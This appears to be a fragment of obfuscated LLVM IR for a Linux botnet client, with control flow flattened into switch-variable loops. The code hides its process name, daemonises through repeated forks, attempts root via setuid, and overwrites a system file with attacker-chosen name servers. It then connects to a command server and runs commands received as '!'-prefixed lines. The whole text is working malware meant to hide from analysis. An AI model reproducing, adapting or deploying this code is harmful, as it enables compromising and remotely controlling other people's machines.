declare i8* @strcpy(i8*, i8*) #3

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #4

; Function Attrs: noinline nounwind uwtable
define void @UpdateNameSrvs() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i16, align 2
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  %4 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.526, i32 0, i32 0), i32 513)
  %5 = trunc i32 %4 to i16
  store i16 %5, i16* %1, align 2
  %6 = call i32 @access(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.526, i32 0, i32 0), i32 0) #5
  store i32 %6, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1176412758, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1176412758, label %first
    i32 -54293308, label %9
    i32 2074270154, label %17
    i32 -1124482438, label %18
    i32 -477815880, label %22
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %7 = icmp ne i32 %.reload, -1
  %8 = select i1 %7, i32 -54293308, i32 2074270154
  store i32 %8, i32* %switchVar
  br label %loopEnd

; <label>:9:                                      ; preds = %loopEntry
  store i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.527, i32 0, i32 0), i8** %2, align 8
  %10 = load i8*, i8** %2, align 8
  %11 = call i64 @strlen(i8* %10) #9
  store i64 %11, i64* %3, align 8
  %12 = load i16, i16* %1, align 2
  %13 = zext i16 %12 to i32
  %14 = load i8*, i8** %2, align 8
  %15 = load i64, i64* %3, align 8
  %16 = call i64 @write(i32 %13, i8* %14, i64 %15)
  store i32 -1124482438, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  store i32 -477815880, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i16, i16* %1, align 2
  %20 = zext i16 %19 to i32
  %21 = call i32 @close(i32 %20)
  store i32 -477815880, i32* %switchVar
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %18, %17, %9, %first, %switchDefault
  br label %loopEntry
}

declare i32 @open(i8*, i32, ...) #1

; Function Attrs: nounwind
declare i32 @access(i8*, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [4096 x i8], align 16
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i8*, align 8
  %19 = alloca [10 x i8*], align 16
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.533, i32 0, i32 0), i8** %6, align 8
  %23 = load i8**, i8*** %5, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 0
  %25 = load i8*, i8** %24, align 8
  %26 = load i8**, i8*** %5, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 0
  %28 = load i8*, i8** %27, align 8
  %29 = call i64 @strlen(i8* %28) #9
  %30 = call i8* @strncpy(i8* %25, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.533, i32 0, i32 0), i64 %29) #5
  %31 = load i8**, i8*** %5, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 0
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.533, i32 0, i32 0), i8** %32, align 8
  %33 = load i8*, i8** %6, align 8
  %34 = ptrtoint i8* %33 to i64
  %35 = call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 %34, i32 0, i32 0, i32 0)
  %36 = call i64 @time(i64* null) #5
  %37 = call i32 @getpid() #5
  %38 = sext i32 %37 to i64
  %39 = xor i64 %36, %38
  %40 = trunc i64 %39 to i32
  call void @srand(i32 %40) #5
  %41 = call i64 @time(i64* null) #5
  %42 = call i32 @getpid() #5
  %43 = sext i32 %42 to i64
  %44 = xor i64 %41, %43
  %45 = trunc i64 %44 to i32
  call void @init_rand(i32 %45)
  %46 = call i32 @fork() #5
  store i32 %46, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %7, align 4
  %switchVar = alloca i32
  store i32 1156440915, i32* %switchVar
  %.reg2mem3 = alloca i1
  %.reg2mem5 = alloca i1
  %.reg2mem7 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1156440915, label %first
    i32 -1582404620, label %49
    i32 1319877633, label %52
    i32 1315661562, label %56
    i32 -377475323, label %60
    i32 51565220, label %61
    i32 852778129, label %65
    i32 -802045189, label %66
    i32 826967976, label %67
    i32 891609762, label %68
    i32 650652685, label %69
    i32 -507653782, label %70
    i32 1855948829, label %71
    i32 -1814408756, label %76
    i32 -1161919183, label %80
    i32 590522619, label %84
    i32 -889949202, label %86
    i32 -772649426, label %91
    i32 -1002054920, label %97
    i32 -2049605588, label %98
    i32 -1217682220, label %104
    i32 462062472, label %113
    i32 -1206317980, label %116
    i32 2011046190, label %122
    i32 1396626523, label %133
    i32 -1686800400, label %136
    i32 665423790, label %149
    i32 -1541002008, label %155
    i32 1313869971, label %165
    i32 1188535418, label %168
    i32 -11885918, label %172
    i32 1380610429, label %173
    i32 981967893, label %176
    i32 -366831836, label %186
    i32 -2088908311, label %187
    i32 1239355959, label %193
    i32 -1548059784, label %194
    i32 -1317504306, label %201
    i32 -1681580853, label %204
    i32 -1267590683, label %210
    i32 339478054, label %215
    i32 -1640408725, label %217
    i32 1370289861, label %220
    i32 -1374513487, label %226
    i32 125952182, label %227
    i32 959682682, label %236
    i32 2038414368, label %246
    i32 43471116, label %255
    i32 1838294272, label %257
    i32 -1647178928, label %263
    i32 -1219291769, label %265
    i32 -2070993496, label %271
    i32 715405168, label %276
    i32 1217180929, label %278
    i32 1864998316, label %281
    i32 -483440198, label %286
    i32 -1722874125, label %291
    i32 -724418180, label %300
    i32 -1157936657, label %305
    i32 -1654138584, label %309
    i32 1139754004, label %315
    i32 694468322, label %338
    i32 541076674, label %340
    i32 1609503369, label %346
    i32 -160689009, label %347
    i32 1193733468, label %352
    i32 -790687232, label %357
    i32 1272838679, label %360
    i32 1560064177, label %361
    i32 -1626758814, label %362
    i32 -1241324571, label %363
    i32 -1791597775, label %364
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %47 = icmp ne i32 %.reload, 0
  %48 = select i1 %47, i32 -1582404620, i32 1319877633
  store i32 %48, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load i32, i32* %7, align 4
  %51 = call i32 @waitpid(i32 %50, i32* %9, i32 0)
  call void @exit(i32 0) #12
  unreachable

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i32, i32* %7, align 4
  %54 = icmp ne i32 %53, 0
  %55 = select i1 %54, i32 650652685, i32 1315661562
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = call i32 @fork() #5
  store i32 %57, i32* %8, align 4
  %58 = icmp ne i32 %57, 0
  %59 = select i1 %58, i32 -377475323, i32 51565220
  store i32 %59, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  call void @exit(i32 0) #12
  unreachable

; <label>:61:                                     ; preds = %loopEntry
  %62 = load i32, i32* %8, align 4
  %63 = icmp ne i32 %62, 0
  %64 = select i1 %63, i32 -802045189, i32 852778129
  store i32 %64, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  store i32 826967976, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  store i32 826967976, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  store i32 891609762, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  store i32 -507653782, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  store i32 -507653782, i32* %switchVar
  br label %loopEnd

; <label>:70:                                     ; preds = %loopEntry
  store i32 1855948829, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.534, i32 0, i32 0)) #5
  %73 = call i32 @setuid(i32 0) #5
  %74 = call i32 @seteuid(i32 0) #5
  %75 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #5
  store i32 -1814408756, i32* %switchVar
  br label %loopEnd

; <label>:76:                                     ; preds = %loopEntry
  %77 = call i32 @fork() #5
  %78 = icmp eq i32 %77, 0
  %79 = select i1 %78, i32 -1161919183, i32 -1791597775
  store i32 %79, i32* %switchVar
  br label %loopEnd

; <label>:80:                                     ; preds = %loopEntry
  %81 = call i32 @initConnection()
  %82 = icmp ne i32 %81, 0
  %83 = select i1 %82, i32 590522619, i32 -889949202
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = call i32 @sleep(i32 5)
  store i32 -1814408756, i32* %switchVar
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  %87 = load i32, i32* @mainCommSock, align 4
  %88 = call i8* @getBuild()
  %89 = call i32 @getEndianness()
  %90 = call i32 (i32, i8*, ...) @sockprintf(i32 %87, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.535, i32 0, i32 0), i8* %88, i32 %89)
  call void @UpdateNameSrvs()
  call void @RemoveTempDirs()
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  store i32 -772649426, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  %92 = load i32, i32* @mainCommSock, align 4
  %93 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %94 = call i32 @recvLine(i32 %92, i8* %93, i32 4096)
  store i32 %94, i32* %11, align 4
  %95 = icmp ne i32 %94, -1
  %96 = select i1 %95, i32 -1002054920, i32 -1241324571
  store i32 %96, i32* %switchVar
  br label %loopEnd

; <label>:97:                                     ; preds = %loopEntry
  store i32 0, i32* %12, align 4
  store i32 -2049605588, i32* %switchVar
  br label %loopEnd

; <label>:98:                                     ; preds = %loopEntry
  %99 = load i32, i32* %12, align 4
  %100 = sext i32 %99 to i64
  %101 = load i64, i64* @numpids, align 8
  %102 = icmp ult i64 %100, %101
  %103 = select i1 %102, i32 -1217682220, i32 981967893
  store i32 %103, i32* %switchVar
  br label %loopEnd

; <label>:104:                                    ; preds = %loopEntry
  %105 = load i32*, i32** @pids, align 8
  %106 = load i32, i32* %12, align 4
  %107 = sext i32 %106 to i64
  %108 = getelementptr inbounds i32, i32* %105, i64 %107
  %109 = load i32, i32* %108, align 4
  %110 = call i32 @waitpid(i32 %109, i32* null, i32 1)
  %111 = icmp sgt i32 %110, 0
  %112 = select i1 %111, i32 462062472, i32 -11885918
  store i32 %112, i32* %switchVar
  br label %loopEnd

; <label>:113:                                    ; preds = %loopEntry
  %114 = load i32, i32* %12, align 4
  %115 = add nsw i32 %114, 1
  store i32 %115, i32* %14, align 4
  store i32 -1206317980, i32* %switchVar
  br label %loopEnd

; <label>:116:                                    ; preds = %loopEntry
  %117 = load i32, i32* %14, align 4
  %118 = zext i32 %117 to i64
  %119 = load i64, i64* @numpids, align 8
  %120 = icmp ult i64 %118, %119
  %121 = select i1 %120, i32 2011046190, i32 -1686800400
  store i32 %121, i32* %switchVar
  br label %loopEnd

; <label>:122:                                    ; preds = %loopEntry
  %123 = load i32*, i32** @pids, align 8
  %124 = load i32, i32* %14, align 4
  %125 = zext i32 %124 to i64
  %126 = getelementptr inbounds i32, i32* %123, i64 %125
  %127 = load i32, i32* %126, align 4
  %128 = load i32*, i32** @pids, align 8
  %129 = load i32, i32* %14, align 4
  %130 = sub i32 %129, 1
  %131 = zext i32 %130 to i64
  %132 = getelementptr inbounds i32, i32* %128, i64 %131
  store i32 %127, i32* %132, align 4
  store i32 1396626523, i32* %switchVar
  br label %loopEnd

; <label>:133:                                    ; preds = %loopEntry
  %134 = load i32, i32* %14, align 4
  %135 = add i32 %134, 1
  store i32 %135, i32* %14, align 4
  store i32 -1206317980, i32* %switchVar
  br label %loopEnd

; <label>:136:                                    ; preds = %loopEntry
  %137 = load i32*, i32** @pids, align 8
  %138 = load i32, i32* %14, align 4
  %139 = sub i32 %138, 1
  %140 = zext i32 %139 to i64
  %141 = getelementptr inbounds i32, i32* %137, i64 %140
  store i32 0, i32* %141, align 4
  %142 = load i64, i64* @numpids, align 8
  %143 = add i64 %142, -1
  store i64 %143, i64* @numpids, align 8
  %144 = load i64, i64* @numpids, align 8
  %145 = add i64 %144, 1
  %146 = mul i64 %145, 4
  %147 = call noalias i8* @malloc(i64 %146) #5
  %148 = bitcast i8* %147 to i32*
  store i32* %148, i32** %13, align 8
  store i32 0, i32* %14, align 4
  store i32 665423790, i32* %switchVar
  br label %loopEnd

; <label>:149:                                    ; preds = %loopEntry
  %150 = load i32, i32* %14, align 4
  %151 = zext i32 %150 to i64
  %152 = load i64, i64* @numpids, align 8
  %153 = icmp ult i64 %151, %152
  %154 = select i1 %153, i32 -1541002008, i32 1188535418
  store i32 %154, i32* %switchVar
  br label %loopEnd

; <label>:155:                                    ; preds = %loopEntry
  %156 = load i32*, i32** @pids, align 8
  %157 = load i32, i32* %14, align 4
  %158 = zext i32 %157 to i64
  %159 = getelementptr inbounds i32, i32* %156, i64 %158
  %160 = load i32, i32* %159, align 4
  %161 = load i32*, i32** %13, align 8
  %162 = load i32, i32* %14, align 4
  %163 = zext i32 %162 to i64
  %164 = getelementptr inbounds i32, i32* %161, i64 %163
  store i32 %160, i32* %164, align 4
  store i32 1313869971, i32* %switchVar
  br label %loopEnd

; <label>:165:                                    ; preds = %loopEntry
  %166 = load i32, i32* %14, align 4
  %167 = add i32 %166, 1
  store i32 %167, i32* %14, align 4
  store i32 665423790, i32* %switchVar
  br label %loopEnd

; <label>:168:                                    ; preds = %loopEntry
  %169 = load i32*, i32** @pids, align 8
  %170 = bitcast i32* %169 to i8*
  call void @free(i8* %170) #5
  %171 = load i32*, i32** %13, align 8
  store i32* %171, i32** @pids, align 8
  store i32 -11885918, i32* %switchVar
  br label %loopEnd

; <label>:172:                                    ; preds = %loopEntry
  store i32 1380610429, i32* %switchVar
  br label %loopEnd

; <label>:173:                                    ; preds = %loopEntry
  %174 = load i32, i32* %12, align 4
  %175 = add nsw i32 %174, 1
  store i32 %175, i32* %12, align 4
  store i32 -2049605588, i32* %switchVar
  br label %loopEnd

; <label>:176:                                    ; preds = %loopEntry
  %177 = load i32, i32* %11, align 4
  %178 = sext i32 %177 to i64
  %179 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 %178
  store i8 0, i8* %179, align 1
  %180 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  call void @trim(i8* %180)
  %181 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %182 = call i8* @strstr(i8* %181, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.510, i32 0, i32 0)) #9
  %183 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %184 = icmp eq i8* %182, %183
  %185 = select i1 %184, i32 -366831836, i32 -2088908311
  store i32 %185, i32* %switchVar
  br label %loopEnd

; <label>:186:                                    ; preds = %loopEntry
  store i32 -772649426, i32* %switchVar
  br label %loopEnd

; <label>:187:                                    ; preds = %loopEntry
  %188 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %189 = call i8* @strstr(i8* %188, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.536, i32 0, i32 0)) #9
  %190 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %191 = icmp eq i8* %189, %190
  %192 = select i1 %191, i32 1239355959, i32 -1548059784
  store i32 %192, i32* %switchVar
  br label %loopEnd

; <label>:193:                                    ; preds = %loopEntry
  call void @exit(i32 0) #12
  unreachable

; <label>:194:                                    ; preds = %loopEntry
  %195 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  store i8* %195, i8** %15, align 8
  %196 = load i8*, i8** %15, align 8
  %197 = load i8, i8* %196, align 1
  %198 = zext i8 %197 to i32
  %199 = icmp eq i32 %198, 33
  %200 = select i1 %199, i32 -1317504306, i32 -1626758814
  store i32 %200, i32* %switchVar
  br label %loopEnd

; <label>:201:                                    ; preds = %loopEntry
  %202 = load i8*, i8** %15, align 8
  %203 = getelementptr inbounds i8, i8* %202, i64 1
  store i8* %203, i8** %16, align 8
  store i32 -1681580853, i32* %switchVar
  br label %loopEnd

; <label>:204:                                    ; preds = %loopEntry
  %205 = load i8*, i8** %16, align 8
  %206 = load i8, i8* %205, align 1
  %207 = zext i8 %206 to i32
  %208 = icmp ne i32 %207, 32
  %209 = select i1 %208, i32 -1267590683, i32 339478054
  store i32 %209, i32* %switchVar
  store i1 false, i1* %.reg2mem3
  br label %loopEnd

; <label>:210:                                    ; preds = %loopEntry
  %211 = load i8*, i8** %16, align 8
  %212 = load i8, i8* %211, align 1
  %213 = zext i8 %212 to i32
  %214 = icmp ne i32 %213, 0
  store i32 339478054, i32* %switchVar
  store i1 %214, i1* %.reg2mem3
  br label %loopEnd

; <label>:215:                                    ; preds = %loopEntry
  %.reload4 = load i1, i1* %.reg2mem3
  %216 = select i1 %.reload4, i32 -1640408725, i32 1370289861
  store i32 %216, i32* %switchVar
  br label %loopEnd

; <label>:217:                                    ; preds = %loopEntry
  %218 = load i8*, i8** %16, align 8
  %219 = getelementptr inbounds i8, i8* %218, i32 1
  store i8* %219, i8** %16, align 8
  store i32 -1681580853, i32* %switchVar
  br label %loopEnd

; <label>:220:                                    ; preds = %loopEntry
  %221 = load i8*, i8** %16, align 8
  %222 = load i8, i8* %221, align 1
  %223 = zext i8 %222 to i32
  %224 = icmp eq i32 %223, 0
  %225 = select i1 %224, i32 -1374513487, i32 125952182
  store i32 %225, i32* %switchVar
  br label %loopEnd

; <label>:226:                                    ; preds = %loopEntry
  store i32 -772649426, i32* %switchVar
  br label %loopEnd

; <label>:227:                                    ; preds = %loopEntry
  %228 = load i8*, i8** %16, align 8
  store i8 0, i8* %228, align 1
  %229 = load i8*, i8** %15, align 8
  %230 = getelementptr inbounds i8, i8* %229, i64 1
  store i8* %230, i8** %16, align 8
  %231 = load i8*, i8** %15, align 8
  %232 = load i8*, i8** %16, align 8
  %233 = call i64 @strlen(i8* %232) #9
  %234 = getelementptr inbounds i8, i8* %231, i64 %233
  %235 = getelementptr inbounds i8, i8* %234, i64 2
  store i8* %235, i8** %15, align 8
  store i32 959682682, i32* %switchVar
  br label %loopEnd

; <label>:236:                                    ; preds = %loopEntry
  %237 = load i8*, i8** %15, align 8
  %238 = load i8*, i8** %15, align 8
  %239 = call i64 @strlen(i8* %238) #9
  %240 = sub i64 %239, 1
  %241 = getelementptr inbounds i8, i8* %237, i64 %240
  %242 = load i8, i8* %241, align 1
  %243 = zext i8 %242 to i32
  %244 = icmp eq i32 %243, 10
  %245 = select i1 %244, i32 43471116, i32 2038414368
  store i32 %245, i32* %switchVar
  store i1 true, i1* %.reg2mem5
  br label %loopEnd

; <label>:246:                                    ; preds = %loopEntry
  %247 = load i8*, i8** %15, align 8
  %248 = load i8*, i8** %15, align 8
  %249 = call i64 @strlen(i8* %248) #9
  %250 = sub i64 %249, 1
  %251 = getelementptr inbounds i8, i8* %247, i64 %250
  %252 = load i8, i8* %251, align 1
  %253 = zext i8 %252 to i32
  %254 = icmp eq i32 %253, 13
  store i32 43471116, i32* %switchVar
  store i1 %254, i1* %.reg2mem5
  br label %loopEnd

; <label>:255:                                    ; preds = %loopEntry
  %.reload6 = load i1, i1* %.reg2mem5
  %256 = select i1 %.reload6, i32 1838294272, i32 -1647178928
  store i32 %256, i32* %switchVar
  br label %loopEnd

; <label>:257:                                    ; preds = %loopEntry
  %258 = load i8*, i8** %15, align 8
  %259 = load i8*, i8** %15, align 8
  %260 = call i64 @strlen(i8* %259) #9
  %261 = sub i64 %260, 1
  %262 = getelementptr inbounds i8, i8* %258, i64 %261
  store i8 0, i8* %262, align 1
  store i32 959682682, i32* %switchVar
  br label %loopEnd

; <label>:263:                                    ; preds = %loopEntry
  %264 = load i8*, i8** %15, align 8
  store i8* %264, i8** %17, align 8
  store i32 -1219291769, i32* %switchVar
  br label %loopEnd

; <label>:265:                                    ; preds = %loopEntry
  %266 = load i8*, i8** %15, align 8
  %267 = load i8, i8* %266, align 1
  %268 = zext i8 %267 to i32
  %269 = icmp ne i32 %268, 32
  %270 = select i1 %269, i32 -2070993496, i32 715405168
  store i32 %270, i32* %switchVar
  store i1 false, i1* %.reg2mem7
  br label %loopEnd

; <label>:271:                                    ; preds = %loopEntry
  %272 = load i8*, i8** %15, align 8
  %273 = load i8, i8* %272, align 1
  %274 = zext i8 %273 to i32
  %275 = icmp ne i32 %274, 0
  store i32 715405168, i32* %switchVar
  store i1 %275, i1* %.reg2mem7
  br label %loopEnd

; <label>:276:                                    ; preds = %loopEntry
  %.reload8 = load i1, i1* %.reg2mem7
  %277 = select i1 %.reload8, i32 1217180929, i32 1864998316
  store i32 %277, i32* %switchVar
  br label %loopEnd

; <label>:278:                                    ; preds = %loopEntry
  %279 = load i8*, i8** %15, align 8
  %280 = getelementptr inbounds i8, i8* %279, i32 1
  store i8* %280, i8** %15, align 8
  store i32 -1219291769, i32* %switchVar
  br label %loopEnd

; <label>:281:                                    ; preds = %loopEntry
  %282 = load i8*, i8** %15, align 8
  store i8 0, i8* %282, align 1
  %283 = load i8*, i8** %15, align 8
  %284 = getelementptr inbounds i8, i8* %283, i32 1
  store i8* %284, i8** %15, align 8
  %285 = load i8*, i8** %17, align 8
  store i8* %285, i8** %18, align 8
  store i32 -483440198, i32* %switchVar
  br label %loopEnd

; <label>:286:                                    ; preds = %loopEntry
  %287 = load i8*, i8** %18, align 8
  %288 = load i8, i8* %287, align 1
  %289 = icmp ne i8 %288, 0
  %290 = select i1 %289, i32 -1722874125, i32 -724418180
  store i32 %290, i32* %switchVar
  br label %loopEnd

; <label>:291:                                    ; preds = %loopEntry
  %292 = load i8*, i8** %18, align 8
  %293 = load i8, i8* %292, align 1
  %294 = zext i8 %293 to i32
  %295 = call i32 @toupper(i32 %294) #9
  %296 = trunc i32 %295 to i8
  %297 = load i8*, i8** %18, align 8
  store i8 %296, i8* %297, align 1
  %298 = load i8*, i8** %18, align 8
  %299 = getelementptr inbounds i8, i8* %298, i32 1
  store i8* %299, i8** %18, align 8
  store i32 -483440198, i32* %switchVar
  br label %loopEnd

; <label>:300:                                    ; preds = %loopEntry
  store i32 1, i32* %20, align 4
  %301 = load i8*, i8** %15, align 8
  %302 = call i8* @strtok(i8* %301, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.537, i32 0, i32 0)) #5
  store i8* %302, i8** %21, align 8
  %303 = load i8*, i8** %17, align 8
  %304 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 0
  store i8* %303, i8** %304, align 16
  store i32 -1157936657, i32* %switchVar
  br label %loopEnd

; <label>:305:                                    ; preds = %loopEntry
  %306 = load i8*, i8** %21, align 8
  %307 = icmp ne i8* %306, null
  %308 = select i1 %307, i32 -1654138584, i32 541076674
  store i32 %308, i32* %switchVar
  br label %loopEnd

; <label>:309:                                    ; preds = %loopEntry
  %310 = load i8*, i8** %21, align 8
  %311 = load i8, i8* %310, align 1
  %312 = zext i8 %311 to i32
  %313 = icmp ne i32 %312, 10
  %314 = select i1 %313, i32 1139754004, i32 694468322
  store i32 %314, i32* %switchVar
  br label %loopEnd

; <label>:315:                                    ; preds = %loopEntry
  %316 = load i8*, i8** %21, align 8
  %317 = call i64 @strlen(i8* %316) #9
  %318 = add i64 %317, 1
  %319 = call noalias i8* @malloc(i64 %318) #5
  %320 = load i32, i32* %20, align 4
  %321 = sext i32 %320 to i64
  %322 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %321
  store i8* %319, i8** %322, align 8
  %323 = load i32, i32* %20, align 4
  %324 = sext i32 %323 to i64
  %325 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %324
  %326 = load i8*, i8** %325, align 8
  %327 = load i8*, i8** %21, align 8
  %328 = call i64 @strlen(i8* %327) #9
  %329 = add i64 %328, 1
  call void @llvm.memset.p0i8.i64(i8* %326, i8 0, i64 %329, i32 1, i1 false)
  %330 = load i32, i32* %20, align 4
  %331 = sext i32 %330 to i64
  %332 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %331
  %333 = load i8*, i8** %332, align 8
  %334 = load i8*, i8** %21, align 8
  %335 = call i8* @strcpy(i8* %333, i8* %334) #5
  %336 = load i32, i32* %20, align 4
  %337 = add nsw i32 %336, 1
  store i32 %337, i32* %20, align 4
  store i32 694468322, i32* %switchVar
  br label %loopEnd

; <label>:338:                                    ; preds = %loopEntry
  %339 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.537, i32 0, i32 0)) #5
  store i8* %339, i8** %21, align 8
  store i32 -1157936657, i32* %switchVar
  br label %loopEnd

; <label>:340:                                    ; preds = %loopEntry
  %341 = load i32, i32* %20, align 4
  %342 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i32 0, i32 0
  call void @processCmd(i32 %341, i8** %342)
  %343 = load i32, i32* %20, align 4
  %344 = icmp sgt i32 %343, 1
  %345 = select i1 %344, i32 1609503369, i32 1560064177
  store i32 %345, i32* %switchVar
  br label %loopEnd

; <label>:346:                                    ; preds = %loopEntry
  store i32 1, i32* %22, align 4
  store i32 1, i32* %22, align 4
  store i32 -160689009, i32* %switchVar
  br label %loopEnd

; <label>:347:                                    ; preds = %loopEntry
  %348 = load i32, i32* %22, align 4
  %349 = load i32, i32* %20, align 4
  %350 = icmp slt i32 %348, %349
  %351 = select i1 %350, i32 1193733468, i32 1272838679
  store i32 %351, i32* %switchVar
  br label %loopEnd

; <label>:352:                                    ; preds = %loopEntry
  %353 = load i32, i32* %22, align 4
  %354 = sext i32 %353 to i64
  %355 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %354
  %356 = load i8*, i8** %355, align 8
  call void @free(i8* %356) #5
  store i32 -790687232, i32* %switchVar
  br label %loopEnd

; <label>:357:                                    ; preds = %loopEntry
  %358 = load i32, i32* %22, align 4
  %359 = add nsw i32 %358, 1
  store i32 %359, i32* %22, align 4
  store i32 -160689009, i32* %switchVar
  br label %loopEnd

; <label>:360:                                    ; preds = %loopEntry
  store i32 1560064177, i32* %switchVar
  br label %loopEnd

; <label>:361:                                    ; preds = %loopEntry
  store i32 -1626758814, i32* %switchVar
  br label %loopEnd

; <label>:362:                                    ; preds = %loopEntry
  store i32 -772649426, i32* %switchVar
  br label %loopEnd

; <label>:363:                                    ; preds = %loopEntry
  store i32 -1791597775, i32* %switchVar
  br label %loopEnd

; <label>:364:                                    ; preds = %loopEntry
  ret i32 0

loopEnd:                                          ; preds = %363, %362, %361, %360, %357, %352, %347, %346, %340, %338, %315, %309, %305, %300, %291, %286, %281, %278, %276, %271, %265, %263, %257, %255, %246, %236, %227, %226, %220, %217, %215, %210, %204, %201, %194, %187, %186, %176, %173, %172, %168, %165, %155, %149, %136, %133, %122, %116, %113, %104, %98, %97, %91, %86, %84, %80, %76, %71, %70, %69, %68, %67, %66, %65, %61, %56, %52, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i8* @strncpy(i8*, i8*, i64) #3

declare i32 @prctl(...) #1

declare i32 @waitpid(i32, i32*, i32) #1

; Function Attrs: nounwind
declare i32 @chdir(i8*) #3

; Function Attrs: nounwind
declare i32 @setuid(i32) #3

; Function Attrs: nounwind
declare i32 @seteuid(i32) #3

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #3

declare i32 @sleep(i32) #1

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
